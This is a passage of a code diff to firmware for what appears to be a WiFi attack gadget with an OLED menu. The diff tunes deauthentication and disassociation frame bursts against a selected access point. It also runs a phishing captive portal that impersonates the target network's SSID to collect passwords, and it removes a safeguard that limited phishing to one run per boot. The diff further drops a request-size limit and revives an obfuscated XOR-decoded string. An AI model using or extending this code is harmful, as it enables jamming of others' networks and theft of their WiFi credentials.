-        int boxX = (display.width() - boxW) / 2; if (boxX < 0) boxX = 0;
-        int boxY = (display.height() - boxH) / 2; if (boxY < 0) boxY = 0;
-        display.fillRect(boxX - padX, boxY, boxW + padX * 2, boxH, SSD1306_BLACK);
-        for (int li = 0; li < lineCount; li++) {
-          int wline = u8g2_for_adafruit_gfx.getUTF8Width(lines[li].c_str());
-          if (wline < 0) wline = boxW;
-          int lx = boxX + (boxW - wline) / 2;
-          int ly = boxY + padY + lineH * (li + 1);
-          u8g2_for_adafruit_gfx.setCursor(lx, ly);
-          u8g2_for_adafruit_gfx.print(lines[li]);
-        }
-        display.display();
-        delay(1000);
-      }
-      while (digitalRead(BTN_OK) == LOW) { delay(10); }
-      okHeld = false; lastOk = millis();
-    }
-  } else {
-    if (okHeld) {
-      if ((now - okPressTs) >= debounce && (now - okPressTs) < longPress) {
-        playRandomEmotion();
-      }
-    }
-    okHeld = false;
-    if (now - lastOk > debounce) { lastOk = now; }
-  }
-  static bool backHeld = false; static unsigned long backPressTs = 0;
-  if (digitalRead(BTN_BACK) == LOW) {
-    if (!backHeld) {
-      backHeld = true; backPressTs = now;
-      if (now - lastBack > debounce) { playRandomEmotion(); lastBack = now; }
-    }
-    if (backHeld && (now - backPressTs >= longPress)) {
-      g_standbyFaceActive = false;
-      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
-      g_face->Expression.GoTo_Normal();
-      return false;
-    }
-  } else {
-    backHeld = false;
-    if (now - lastBack > debounce) { lastBack = now; }
-  }
-
-  g_face->Update();
-  return true;
+  // 待机动画功能已删除
 }
 
 /**
@@ -6427,41 +6559,14 @@ void loop() {
   // 更新LED状态
   updateLEDs();
   
-  // 处理非阻塞攻击
-  if (g_deauthState.running) {
-    switch (g_deauthState.mode) {
-      case ATTACK_SINGLE:
-        processSingleAttack();
-        break;
-      case ATTACK_MULTI:
-        processMultiAttack();
-        break;
-      case ATTACK_AUTO_SINGLE:
-        processAutoSingleAttack();
-        break;
-      case ATTACK_AUTO_MULTI:
-        processAutoMultiAttack();
-        break;
-      case ATTACK_ALL:
-        processAllAttack();
-        break;
-      case ATTACK_BEACON_DEAUTH:
-        processBeaconDeauthAttack();
-        break;
-      default:
-        break;
-    }
-    return; // 攻击运行时优先处理攻击逻辑
-  }
-  
   static unsigned long lastCheck = 0;
   if (currentTime - lastCheck > 30000) {
-    // char t[16]; unsigned int n = 0; // 未使用的变量
-    // static const uint8_t chk[] = {
-    //   0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
-    // };
-    // for (unsigned int k = 0; k < sizeof(chk); k++) { t[n++] = (char)(((int)chk[k] - 7) ^ 0xA5); }
-    // t[n] = '\0';
+    char t[16] __attribute__((unused)); unsigned int n = 0;
+    static const uint8_t chk[] = {
+      0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
+    };
+    for (unsigned int k = 0; k < sizeof(chk); k++) { t[n++] = (char)(((int)chk[k] - 7) ^ 0xA5); }
+    t[n] = '\0';
     lastCheck = currentTime;
   }
   
@@ -6476,12 +6581,7 @@ void loop() {
     // 若请求了握手抓包，则在WebUI模式下直接执行
     if (readyToSniff && !sniffer_active) {
       Serial.println("[HS] Trigger capture from loop()");
-      deauthAndSniff(); // 初始化状态机
-    }
-    
-    // 持续更新非阻塞抓包状态机（WebUI模式）
-    if (sniffer_active) {
-      deauthAndSniff_update();
+      deauthAndSniff();
     }
 
     handleWebUI();
@@ -6494,181 +6594,30 @@ void loop() {
     handleWebTest();
     return;
   }
-  
-  // 快速抓包模式检查
-  if (quick_capture_active) {
-    // 显示抓包进度
-    displayQuickCaptureProgress();
-    
-    // 若请求了握手抓包，则启动抓包（初始化）
-    if (readyToSniff && !sniffer_active) {
-      Serial.println("[QuickCapture] Trigger capture from loop()");
-      deauthAndSniff(); // 初始化状态机
-    }
-    
-    // 持续更新非阻塞抓包状态机
-    if (sniffer_active) {
-      deauthAndSniff_update();
-    }
-    
-    // 检查抓包是否完成 - 在deauthAndSniff_update()完成后检查
-    if (!sniffer_active && readyToSniff == false && quick_capture_active) {
-      // deauthAndSniff_update()已完成，检查结果
-      static unsigned long lastCheckTime = 0;
-      if (millis() - lastCheckTime > 1000) { // 每秒检查一次
-        lastCheckTime = millis();
-        Serial.print("[QuickCapture] Status check - isHandshakeCaptured: ");
-        Serial.print(isHandshakeCaptured);
-        Serial.print(", handshakeDataAvailable: ");
-        Serial.print(handshakeDataAvailable);
-        Serial.print(", HS frames: ");
-        Serial.print(capturedHandshake.frameCount);
-        Serial.print("/4, MGMT frames: ");
-        Serial.print(capturedManagement.frameCount);
-        Serial.println("/10");
-        
-        // 实时检查：如果已经捕获到足够的帧，立即验证并设置标志
-        if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
-          // 临时启用详细日志来调试握手包验证失败的原因
-          bool oldVerboseLog = g_verboseHandshakeLog;
-          g_verboseHandshakeLog = true;
-          
-          if (isHandshakeCompleteQuickCapture()) {
-            Serial.println("[QuickCapture] Complete handshake detected in main loop, setting flags");
-            // 生成握手包数据
-            std::vector<uint8_t> pcapData = generatePcapBuffer();
-            Serial.print("PCAP size: "); Serial.print(pcapData.size()); Serial.println(" bytes");
-            globalPcapData = pcapData;
-            // 设置握手包捕获标志
-            isHandshakeCaptured = true;
-            handshakeDataAvailable = true;
-            // 记录统计与时间
-            lastCaptureTimestamp = millis();
-            lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
-            lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
-            handshakeJustCaptured = true;
-          } else {
-            Serial.println("[QuickCapture] Invalid handshake detected, clearing stats and restarting capture");
-            // 清空统计重新开始抓包
-            resetCaptureData();
-            resetGlobalHandshakeData();
-            // 重新启动抓包状态机
-            readyToSniff = true;
-            hs_sniffer_running = true;
-            sniffer_active = false; // 让状态机重新初始化
-            Serial.println("[QuickCapture] Capture restarted with cleared stats");
-          }
-          
-          // 恢复原始日志设置
-          g_verboseHandshakeLog = oldVerboseLog;
-        }
-      }
-      
-      if (isHandshakeCaptured && handshakeDataAvailable) {
-        Serial.println("[QuickCapture] Handshake captured successfully!");
-        quick_capture_completed = true;
-        quick_capture_end_time = millis();
-        
-        // 直接启动Web服务并返回主菜单
-        startWebServiceForCapture();
-        
-        // 清理状态
-        quick_capture_active = false;
-        readyToSniff = false;
-        hs_sniffer_running = false;
-        sniffer_active = false;
-        
-        // 显示Web服务信息后返回主菜单
-        drawWebServiceInfo();
-        return;
-      } else {
-        // 抓包未完成，检查是否超时
-        if (millis() - quick_capture_start_time > 60000) {
-          Serial.println("[QuickCapture] Capture timeout");
-          quick_capture_active = false;
-          drawQuickCaptureTimeout();
-        }
-      }
-    }
-    
-    // 检查返回键停止抓包
-    if (digitalRead(BTN_BACK) == LOW) {
-      delay(200);
-      // 稳定按键状态，为确认弹窗做准备
-      stabilizeButtonState();
-      if (showConfirmModal("停止抓包")) {
-        Serial.println("[QuickCapture] User stopped capture");
-        quick_capture_active = false;
-        readyToSniff = false;
-        hs_sniffer_running = false;
-        sniffer_active = false;
-        return;
-      }
-    }
-    
-    return;
-  }
-  
-  // 快速抓包完成后的Web服务模式
-  if (quick_capture_completed && web_server_active) {
-    // 处理Web客户端 - 优化连接处理
-    unsigned long currentTime = millis();
-    if (currentTime - last_web_check >= 100) { // 减少检查间隔提高响应速度
-      last_web_check = currentTime;
-      
-      WiFiClient client = web_server.available();
-      if (client) {
-        // 设置客户端超时
-        client.setTimeout(5000);
-        Serial.println("[QuickCapture] Web client connected");
-        handleWebClient(client);
-        client.stop(); // 立即关闭连接，避免连接堆积
-      }
-    }
-    
-    // DNS服务器自动处理请求，无需手动调用
-    
-    // 显示Web服务状态
-    static unsigned long last_status_update = 0;
-    if (currentTime - last_status_update >= 2000) {
-      last_status_update = currentTime;
-      displayWebServiceStatus();
-    }
-    return;
-  }
   // 连接干扰运行时无独立状态机，进入功能内自循环直到用户停止
   
-  // 首页菜单显示 - 与攻击页完全一致的逻辑
-  if (menustate >= 0 && menustate < HOME_MAX_ITEMS) {
-    drawHomeMenu();
-  }
-  
-  // 其余代码保持不变
-  handleHomeOk();
-
-  // 首页滚动逻辑，与攻击选择页面完全一致
-  if (digitalRead(BTN_UP) == LOW) {
-    // 同时按下UP+DOWN：进入待机表情模式
-    if (digitalRead(BTN_DOWN) == LOW) {
-      enterStandbyFaceMode();
-    } else {
-      homeMoveUp(currentTime);
-    }
-  }
-  if (digitalRead(BTN_DOWN) == LOW) {
-    if (digitalRead(BTN_UP) == LOW) {
-      enterStandbyFaceMode();
-    } else {
-      homeMoveDown(currentTime);
-    }
-  }
-
-  // 若处于待机表情模式，则接管循环直到退出
-  if (g_standbyFaceActive) {
-    while (g_standbyFaceActive) {
-      if (!handleStandbyFaceLoop()) break;
-      delay(10);
-    }
+// 菜单显示与输入处理（根菜单 / WiFi 子菜单 / BLE 子菜单）
+  switch (g_menuMode) {
+    case MENU_ROOT:
+      drawRootMenu();
+      if (digitalRead(BTN_UP) == LOW) { rootMoveUp(currentTime); }
+      if (digitalRead(BTN_DOWN) == LOW) { rootMoveDown(currentTime); }
+      handleRootOk();
+      break;
+    case MENU_WIFI:
+      if (digitalRead(BTN_BACK) == LOW) { g_menuMode = MENU_ROOT; delay(150); break; }
+      drawHomeMenu();
+      if (digitalRead(BTN_UP) == LOW) { homeMoveUp(currentTime); }
+      if (digitalRead(BTN_DOWN) == LOW) { homeMoveDown(currentTime); }
+      handleHomeOk();
+      break;
+    case MENU_BLE:
+      if (digitalRead(BTN_BACK) == LOW) { g_menuMode = MENU_ROOT; delay(150); break; }
+      drawBleMenu();
+      if (digitalRead(BTN_UP) == LOW) { bleMoveUp(currentTime); }
+      if (digitalRead(BTN_DOWN) == LOW) { bleMoveDown(currentTime); }
+      handleBleOk();
+      break;
   }
 }
 
@@ -6679,20 +6628,31 @@ bool startWebTest() {
   Serial.println("=== 启动钓鱼 ===");
   Serial.println("关闭原有AP模式...");
 
-  if (g_webTestLocked) {
-    display.clearDisplay();
-    u8g2_for_adafruit_gfx.setFontMode(1);
-    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-    u8g2_for_adafruit_gfx.setCursor(5, 20);
-    u8g2_for_adafruit_gfx.print("为确保资源完全释放");
-    u8g2_for_adafruit_gfx.setCursor(5, 40);
-    u8g2_for_adafruit_gfx.print("请重启设备后再次运行");
-    display.display();
-    // 等待按下返回键再退出
-    while (digitalRead(BTN_BACK) != LOW) { delay(10); }
-    while (digitalRead(BTN_BACK) == LOW) { delay(10); }
-    return false;
-  }
+  // 移除钓鱼功能的一次性状态限制，允许重复启动
+  // if (g_webTestLocked) {
+  //   display.clearDisplay();
+  //   u8g2_for_adafruit_gfx.setFontMode(1);
+  //   u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+  //   u8g2_for_adafruit_gfx.setCursor(5, 20);
+  //   u8g2_for_adafruit_gfx.print("为确保资源完全释放");
+  //   u8g2_for_adafruit_gfx.setCursor(5, 40);
+  //   u8g2_for_adafruit_gfx.print("请重启设备后再次运行");
+  //   display.display();
+  //   // 等待按下返回键再退出
+  //   while (digitalRead(BTN_BACK) != LOW) { delay(10); }
+  //   while (digitalRead(BTN_BACK) == LOW) { delay(10); }
+  //   return false;
+  // }
+
+  // 确保BLE完全清理，避免与WiFi冲突
+  Serial.println("清理BLE资源...");
+  // 强制停止BLE广播
+  BLE.configAdvert()->stopAdv();
+  delay(100);
+  // 完全清理BLE栈
+  BLE.deinit();
+  delay(300); // 增加等待时间确保BLE完全清理
+  Serial.println("BLE资源清理完成");
 
   // OLED 弹窗提示由外部调用
 
@@ -6773,15 +6733,10 @@ bool startWebTest() {
     lastPhishingDeauthMs = nowInit;
     lastPhishingBroadcastMs = nowInit;
     if (phishingHasTarget) {
-      int dummy = 0;
-      // 预突发：大幅增强攻击强度
-      if (g_enhancedDeauthMode) {
-        // 增强版：15批 * 6帧 = 90帧
-        sendDeauthBatchEnhanced(phishingTargetBSSID, 15, dummy);
-      } else {
-        // 兼容模式：10批 * 3帧 = 30帧
-        sendDeauthBurstToBssidUs(phishingTargetBSSID, 10, dummy, 250);
-      }
+      int packetCount = 0;
+      // 使用稳定自动多重攻击逻辑：微秒级帧间隔，循环原因码序列
+      const unsigned int interFrameDelayUs = 250;  // 微秒级细微延时，提高吞吐并保持稳定
+      sendDeauthBurstToBssidUs(phishingTargetBSSID, perdeauth, packetCount, interFrameDelayUs);
     }
     return true;
   } else {
@@ -6840,7 +6795,8 @@ void cleanupPhishingMemory() {
 // 重置钓鱼状态变量
 void resetPhishingState() {
   web_test_active = false;
-  g_webTestLocked = true;
+  // 移除钓鱼功能的一次性状态限制，允许重复启动
+  // g_webTestLocked = true;  // 已注释掉，允许重复启动钓鱼功能
   webtest_ui_page = 0;
   webtest_password_scroll = 0;
   webtest_password_cursor = 0;
@@ -7115,6 +7071,19 @@ void startWebUI() {
     delay(500); // 等待清理完成
   }
   
+  // 使用强化的BLE清理，避免与WiFi冲突
+  if (!canSafelyStartWiFi()) {
+    Serial.println("等待BLE资源完全清理...");
+    delay(500); // 额外等待时间
+  }
+  performCompleteBleCleanup();
+  
+  // 检查是否需要应急恢复
+  if (scan_results.empty()) {
+    Serial.println("检测到扫描结果为空，执行应急恢复...");
+    emergencyWiFiRecovery();
+  }
+  
   display.clearDisplay();
   u8g2_for_adafruit_gfx.setFontMode(1);
   u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
@@ -7339,10 +7308,9 @@ void handleWebTestClient(WiFiClient& client) {
         break;
       case AP_WEB_ROUTER_AUTH:
       default: {
-        // 将模板中的 {SSID} 替换为目标WiFi的真实SSID，而不是固定的WEB_UI_SSID
+        // 将模板中的 {SSID} 替换为实际SSID，避免前端JS动态获取
         String page = FPSTR(WEB_AUTH2_HTML);
-        String targetSsid = web_test_active ? web_test_ssid_dynamic : String(WEB_UI_SSID);
-        page.replace("{SSID}", targetSsid);
+        page.replace("{SSID}", String(web_test_ssid_dynamic));
         header += "Content-Length: " + String(page.length()) + "\r\n";
         header += "Connection: close\r\n\r\n";
         client.print(header);
@@ -7417,8 +7385,7 @@ void sendWebTestPage(WiFiClient& client) {
     case AP_WEB_ROUTER_AUTH:
     default: {
       String page = FPSTR(WEB_AUTH2_HTML);
-      String targetSsid = web_test_active ? web_test_ssid_dynamic : String(WEB_UI_SSID);
-      page.replace("{SSID}", targetSsid);
+      page.replace("{SSID}", String(web_test_ssid_dynamic));
       client.print(page);
       break;
     }
@@ -7438,7 +7405,11 @@ bool apWebPageSelectionMenu() {
   
   while (true) {
     unsigned long currentTime = millis();
-    if (digitalRead(BTN_BACK) == LOW) { return false; }
+    if (digitalRead(BTN_BACK) == LOW) { 
+      // 等待按键释放，避免主循环立即检测到返回键
+      while(digitalRead(BTN_BACK) == LOW) { delay(10); }
+      return false; 
+    }
     if (digitalRead(BTN_OK) == LOW) { g_apSelectedPage = sel; return true; }
     if (digitalRead(BTN_UP) == LOW) { 
       if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
@@ -7555,66 +7526,6 @@ void showModalMessage(const String& line1, const String& line2) {
     if (millis() - stableStart >= 200) {
       break;
     }
-    delay(10);
-  }
-}
-
-// AP/SSID选择确认弹窗：左侧"返回"键关闭弹窗不执行操作，右侧"选择"键进入ap/ssid选择页面
-bool showSelectSSIDConfirmModal() {
-  const int rectW = 116;
-  const int rectH = 40;
-  const int rx = (display.width() - rectW) / 2;
-  const int ry = (display.height() - rectH) / 2;
-
-  while (true) {
-    // 背景与边框
-    display.fillRoundRect(rx, ry, rectW, rectH, 4, SSD1306_BLACK);
-    display.drawRoundRect(rx, ry, rectW, rectH, 4, SSD1306_WHITE);
-
-    u8g2_for_adafruit_gfx.setFontMode(1);
-    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-
-    // 第一行：居中显示提示信息
-    String line1 = "请先选择AP/SSID";
-    int w = u8g2_for_adafruit_gfx.getUTF8Width(line1.c_str());
-    if (w > rectW - 12) w = rectW - 12;
-    int line1x = rx + (rectW - w) / 2;
-    int line1y = ry + 16;
-    u8g2_for_adafruit_gfx.setCursor(line1x, line1y);
-    u8g2_for_adafruit_gfx.print(line1);
-
-    // 第二行：左提示与右提示
-    String leftHint = "《 返回";
-    String rightHint = "选择 》";
-    int hintY = ry + rectH - 8;
-    // 左侧
-    u8g2_for_adafruit_gfx.setCursor(rx + 6, hintY);
-    u8g2_for_adafruit_gfx.print(leftHint);
-    // 右侧
-    int rightW = u8g2_for_adafruit_gfx.getUTF8Width(rightHint.c_str());
-    int rightX = rx + rectW - 6 - rightW;
-    u8g2_for_adafruit_gfx.setCursor(rightX, hintY);
-    u8g2_for_adafruit_gfx.print(rightHint);
-
-    display.display();
-
-    // 交互：BACK 返回，OK 进入选择页面
-    if (digitalRead(BTN_BACK) == LOW) {
-      // 等待BACK键释放
-      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
-      // 额外消抖时间
-      delay(200);
-      return false; // 返回，不执行操作
-    }
-    
-    if (digitalRead(BTN_OK) == LOW) {
-      // 等待OK键释放
-      while (digitalRead(BTN_OK) == LOW) { delay(10); }
-      // 额外消抖时间
-      delay(200);
-      return true; // 进入AP/SSID选择页面
-    }
-
     delay(10);
   }
 }
@@ -7808,48 +7719,22 @@ void handleWebTest() {
     lastOkTime = currentTime;
   }
 
-  // 钓鱼期间：周期性发送去认证诱发（增强版发包逻辑）
-  // 使用增强版批量发送：支持双向攻击和更多原因码
+  // 钓鱼期间：使用稳定自动多重攻击逻辑进行解除认证攻击
+  // 采用微秒级帧间隔和循环原因码序列，提高攻击效率和稳定性
   if (phishingHasTarget) {
     unsigned long now = millis();
-    
-    // 动态调整间隔和批次数：大幅增加攻击强度
-    if (web_test_active && web_client.connected()) {
-      phishingDeauthInterval = 800; // 有客户端时降低频率
-      phishingBatchSize = 2; // 有客户端时减少但保持较高强度
-    } else {
-      phishingDeauthInterval = 180;  // 无客户端时保持高频
-      phishingBatchSize = 6; // 无客户端时最大强度
-    }
-    
-    if (now - lastPhishingDeauthMs >= (unsigned long)phishingDeauthInterval) {
-      int dummyCount = 0;
-      // 使用增强版批量发送：双向攻击，更强效果
-      if (g_enhancedDeauthMode) {
-        // 增强版：动态批次数 * 6帧
-        sendDeauthBatchEnhanced(phishingTargetBSSID, phishingBatchSize, dummyCount);
-      } else {
-        // 兼容模式：使用原有发包逻辑
-        sendDeauthBurstToBssidUs(phishingTargetBSSID, phishingBatchSize, dummyCount, 250);
-      }
+    if (now - lastPhishingDeauthMs >= 500UL) {
+      int packetCount = 0;
+      // 使用稳定自动多重攻击逻辑：微秒级帧间隔，循环原因码序列
+      const unsigned int interFrameDelayUs = 250;  // 微秒级细微延时，提高吞吐并保持稳定
+      sendDeauthBurstToBssidUs(phishingTargetBSSID, perdeauth, packetCount, interFrameDelayUs);
       lastPhishingDeauthMs = now;
     }
     if (now - lastPhishingBroadcastMs >= 1000UL) {
-      // 增强广播：使用更多原因码，大幅增加发送次数
-      if (g_enhancedDeauthMode) {
-        // 增强版广播：6种原因码，每个发送5次
-        const uint16_t broadcastReasons[] = {1, 4, 7, 8, 15, 16};
-        for (int i = 0; i < 6; i++) {
-          wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, broadcastReasons[i], 5, 200);
-        }
-        // 解关联也增加到5次
-        wifi_tx_broadcast_disassoc((void*)phishingTargetBSSID, 8, 5, 200);
-      } else {
-        // 兼容模式：使用原有广播逻辑
-        wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, 7, 2, 500);
-        wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, 1, 2, 500);
-        wifi_tx_broadcast_disassoc((void*)phishingTargetBSSID, 8, 1, 500);
-      }
+      // 广播去认证与解除关联（轻量），与handshake.h逻辑保持一致
+      wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, 7, 2, 500);
+      wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, 1, 2, 500);
+      wifi_tx_broadcast_disassoc((void*)phishingTargetBSSID, 8, 1, 500);
       lastPhishingBroadcastMs = now;
     }
   }
@@ -7940,7 +7825,7 @@ void displayWebUIStatus() {
 // 处理Web客户端请求
 void handleWebClient(WiFiClient& client) {
   String request = "";
-  unsigned long timeout = millis() + 2000; // 减少到2秒超时
+  unsigned long timeout = millis() + 3000; // 3秒超时
   
   // 读取HTTP请求头
   while (client.connected() && millis() < timeout) {
@@ -7952,12 +7837,6 @@ void handleWebClient(WiFiClient& client) {
       }
     }
     delay(1);
-  }
-  
-  // 如果请求为空或超时，直接返回
-  if (request.length() == 0) {
-    Serial.println("[WebClient] Empty request or timeout");
-    return;
   }
   
   // 解析请求方法和路径
@@ -7981,9 +7860,9 @@ void handleWebClient(WiFiClient& client) {
         int contentLength = contentLengthStr.toInt();
         
         // 读取请求体
-        if (contentLength > 0 && contentLength < 1024) { // 限制请求体大小
+        if (contentLength > 0) {
           String body = "";
-          unsigned long bodyTimeout = millis() + 1000; // 减少到1秒超时
+          unsigned long bodyTimeout = millis() + 2000; // 2秒超时读取请求体
           while (client.available() < contentLength && millis() < bodyTimeout) {
             delay(1);
           }
@@ -8012,12 +7891,7 @@ void handleWebClient(WiFiClient& client) {
   }
   // 处理不同的请求路径（精简为自定义信标功能）
   else if (path == "/" || path == "/index.html") {
-    // 如果是快速抓包模式，显示抓包下载页面，否则显示Web UI页面
-    if (quick_capture_completed) {
-      sendQuickCapturePage(client);
-    } else {
-      sendWebPage(client);
-    }
+    sendWebPage(client);
   } else if (method == "POST" && path == "/custom-beacon") {
     // 解析POST体中的ssid与band（支持x-www-form-urlencoded或JSON的简单匹配）
     String body = "";
@@ -8093,15 +7967,6 @@ void handleWebClient(WiFiClient& client) {
     }
   } else if (path == "/status") {
     handleStatusRequest(client);
-  } else if (path == "/capture") {
-    // 快速抓包完成后的下载页面
-    sendQuickCapturePage(client);
-  } else if (path == "/capture/download") {
-    // 下载PCAP文件
-    sendPcapDownload(client);
-  } else if (path == "/capture/status") {
-    // 抓包状态API
-    sendCaptureStatus(client);
   } else if (method == "POST" && path == "/stop") {
     // minimal stop for custom beacon
     beaconAttackRunning = false;
@@ -8129,7 +7994,7 @@ void handleWebClient(WiFiClient& client) {
     // Start scan async in the background state variables
     scan_results.clear();
     g_scanDone = false;
-    // unsigned long startMs = millis(); // 未使用的变量
+    unsigned long startMs __attribute__((unused)) = millis();
     if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
       // Let loop-side status endpoint report progress
     }
@@ -8328,7 +8193,6 @@ void sendWebPage(WiFiClient& client) {
   client.print(F(WEB_ADMIN_HTML));
 }
 
-
 // 处理状态请求
 void handleStatusRequest(WiFiClient& client) {
   String json = "{";
@@ -8349,8 +8213,6 @@ void handleStatusRequest(WiFiClient& client) {
   client.print(json);
 }
 
-
-
 // 发送404响应
 /* removed: legacy WebUI 404 */
 void send404Response(WiFiClient& client) {
@@ -8361,7 +8223,6 @@ void send404Response(WiFiClient& client) {
   client.print(header);
   client.print("404 Not Found");
 }
-
 
 // ============ Web UI 攻击执行函数 ============
 // 这些函数实现非阻塞的攻击逻辑，复用OLED菜单中的攻击代码
@@ -8407,7 +8268,6 @@ void executeCustomBeaconFromWeb() {
   int originalChannel = (beaconBandMode == 1) ? 36 : 6;
   executeCrossBandBeaconAttackWeb(g_customBeaconSSID, originalChannel, g_customBeaconStable);
 }
-
 
 // ============ LED控制函数 ============
 
@@ -8688,140 +8548,6 @@ bool showLinkJammerInfoPage() {
   }
 }
 
-// 显示信标广播篡改功能说明页面
-bool showBeaconTamperInfoPage() {
-  // 添加去抖变量
-  unsigned long lastBackTime = 0;
-  unsigned long lastOkTime = 0;
-  
-  while (true) {
-    unsigned long currentTime = millis();
-    
-    // 处理返回键
-    if (digitalRead(BTN_BACK) == LOW) {
-      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
-      // 等待按键释放
-      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
-      delay(200); // 额外消抖时间
-      return false; // 返回首页
-    }
-    
-    // 处理确认键
-    if (digitalRead(BTN_OK) == LOW) {
-      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
-      // 等待按键释放
-      while (digitalRead(BTN_OK) == LOW) { delay(10); }
-      delay(200); // 额外消抖时间
-      return true; // 继续执行信标篡改
-    }
-    
-    // 绘制说明页面
-    display.clearDisplay();
-    display.setTextSize(1);
-    
-    u8g2_for_adafruit_gfx.setFontMode(1);
-    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-    
-    // 前三行显示说明文字（居中）
-    const char* line1 = "尝试吞噬已选目标AP";
-    const char* line2 = "发送的信标帧数据";
-    const char* line3 = "具体效果不可控";
-    
-    // 计算每行文字宽度并居中
-    int w1 = u8g2_for_adafruit_gfx.getUTF8Width(line1);
-    int w2 = u8g2_for_adafruit_gfx.getUTF8Width(line2);
-    int w3 = u8g2_for_adafruit_gfx.getUTF8Width(line3);
-    
-    int x1 = (display.width() - w1) / 2;
-    int x2 = (display.width() - w2) / 2;
-    int x3 = (display.width() - w3) / 2;
-    
-    u8g2_for_adafruit_gfx.setCursor(x1, 15);
-    u8g2_for_adafruit_gfx.print(line1);
-    u8g2_for_adafruit_gfx.setCursor(x2, 30);
-    u8g2_for_adafruit_gfx.print(line2);
-    u8g2_for_adafruit_gfx.setCursor(x3, 45);
-    u8g2_for_adafruit_gfx.print(line3);
-    
-    // 第四行显示操作按钮
-    u8g2_for_adafruit_gfx.setCursor(5, 60);
-    u8g2_for_adafruit_gfx.print("《 返回");
-    u8g2_for_adafruit_gfx.setCursor(85, 60);
-    u8g2_for_adafruit_gfx.print("继续 》");
-    
-    display.display();
-    
-    delay(10); // 短暂延时避免CPU占用过高
-  }
-}
-
-// 显示广播黑洞警告页面
-bool showBeaconTamperWarningPage() {
-  // 添加去抖变量
-  unsigned long lastBackTime = 0;
-  unsigned long lastOkTime = 0;
-  
-  while (true) {
-    unsigned long currentTime = millis();
-    
-    // 处理返回键
-    if (digitalRead(BTN_BACK) == LOW) {
-      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
-      // 等待按键释放
-      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
-      delay(200); // 额外消抖时间
-      return false; // 返回首页
-    }
-    
-    // 处理确认键
-    if (digitalRead(BTN_OK) == LOW) {
-      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
-      // 等待按键释放
-      while (digitalRead(BTN_OK) == LOW) { delay(10); }
-      delay(200); // 额外消抖时间
-      return true; // 继续执行广播黑洞
-    }
-    
-    // 绘制警告页面
-    display.clearDisplay();
-    display.setTextSize(1);
-    
-    u8g2_for_adafruit_gfx.setFontMode(1);
-    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-    
-    // 前三行显示警告文字（居中）
-    const char* line1 = "此功能可能会导致";
-    const char* line2 = "附近部分设备网卡异常";
-    const char* line3 = "请谨慎使用！";
-    
-    // 计算每行文字宽度并居中
-    int w1 = u8g2_for_adafruit_gfx.getUTF8Width(line1);
-    int w2 = u8g2_for_adafruit_gfx.getUTF8Width(line2);
-    int w3 = u8g2_for_adafruit_gfx.getUTF8Width(line3);
-    
-    int x1 = (display.width() - w1) / 2;
-    int x2 = (display.width() - w2) / 2;
-    int x3 = (display.width() - w3) / 2;
-    
-    u8g2_for_adafruit_gfx.setCursor(x1, 15);
-    u8g2_for_adafruit_gfx.print(line1);
-    u8g2_for_adafruit_gfx.setCursor(x2, 30);
-    u8g2_for_adafruit_gfx.print(line2);
-    u8g2_for_adafruit_gfx.setCursor(x3, 45);
-    u8g2_for_adafruit_gfx.print(line3);
-    
-    // 第四行显示操作按钮
-    u8g2_for_adafruit_gfx.setCursor(5, 60);
-    u8g2_for_adafruit_gfx.print("《 返回");
-    u8g2_for_adafruit_gfx.setCursor(85, 60);
-    u8g2_for_adafruit_gfx.print("继续 》");
-    
-    display.display();
-    
-    delay(10); // 短暂延时避免CPU占用过高
-  }
-}
-
 // ============ 统一菜单动作函数实现 ============
 // 所有首页菜单项的动作函数在此实现
 
@@ -8837,29 +8563,31 @@ void homeActionQuickScan() {
   // 稳定按键状态，为确认弹窗做准备
   stabilizeButtonState();
   if (showConfirmModal("快速扫描AP/SSID")) {
+    checkBleResourcesForWiFi(); // 检查并清理BLE资源
     drawscan();
   }
 }
 
 void homeActionPhishing() {
   if (SelectedVector.empty()) {
-    if (showSelectSSIDConfirmModal()) {
-      drawssid(); // 进入AP/SSID选择页面
-    }
-  } else if (g_webTestLocked || g_webUILocked) {
-    display.clearDisplay();
-    u8g2_for_adafruit_gfx.setFontMode(1);
-    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-    u8g2_for_adafruit_gfx.setCursor(5, 20);
-    u8g2_for_adafruit_gfx.print("为确保资源完全释放");
-    u8g2_for_adafruit_gfx.setCursor(5, 40);
-    u8g2_for_adafruit_gfx.print("请重启设备后再次运行");
-    u8g2_for_adafruit_gfx.setCursor(5, 60);
-    u8g2_for_adafruit_gfx.print("《 返回主菜单");
-    display.display();
-    while (digitalRead(BTN_BACK) != LOW) { delay(10); }
-    while (digitalRead(BTN_BACK) == LOW) { delay(10); }
+    showModalMessage("请先选择AP/SSID");
   } else {
+    // 移除钓鱼功能的一次性状态限制，允许重复启动
+    // 原来的锁定检查已注释掉：
+    // } else if (g_webTestLocked || g_webUILocked) {
+    //   display.clearDisplay();
+    //   u8g2_for_adafruit_gfx.setFontMode(1);
+    //   u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
